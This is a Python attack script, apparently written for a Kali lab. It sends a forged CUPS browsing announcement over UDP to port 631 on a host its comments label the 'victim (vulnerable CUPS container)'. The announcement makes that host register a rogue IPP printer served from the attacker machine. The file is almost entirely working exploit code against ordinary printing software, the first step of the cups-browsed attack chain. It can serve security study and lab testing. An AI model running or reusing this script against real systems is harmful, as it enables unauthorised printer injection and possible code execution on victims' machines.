
#!/usr/bin/env python3

import socket


def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port):

    print("Sending CUPS browsing announcement to %s:%d ..." % (ip, port))

    # Printer information
    printer_type = 0x00
    printer_state = 0x03

    # IPP server URI
    printer_uri = 'http://%s:%d/printers/NAME' % (
        ipp_server_host, ipp_server_port
    )

    printer_location = 'Kali Lab'
    printer_info = 'LabPrinter'

    # Build CUPS browsing announcement
    message = bytes('%x %x %s "%s" "%s"' %
                    (printer_type,
                     printer_state,
                     printer_uri,
                     printer_location,
                     printer_info), 'UTF-8')

    # Send announcement through UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message, (ip, port))

    print("[+] Announcement sent successfully")
    print("    Source:      %s" % ipp_server_host)
    print("    Destination: %s:%d" % (ip, port))
    print("    Message:     %s" % message.decode('UTF-8'))

    sock.close()


if __name__ == "__main__":

    # Attacker / virtual printer (Kali)
    SERVER_HOST = "172.18.0.1"
    SERVER_PORT = 8631

    # Victim (vulnerable CUPS container)
    TARGET_HOST = "172.18.0.2"
    TARGET_PORT = 631

    send_browsed_packet(
        TARGET_HOST,
        TARGET_PORT,
        SERVER_HOST,
        SERVER_PORT
    )
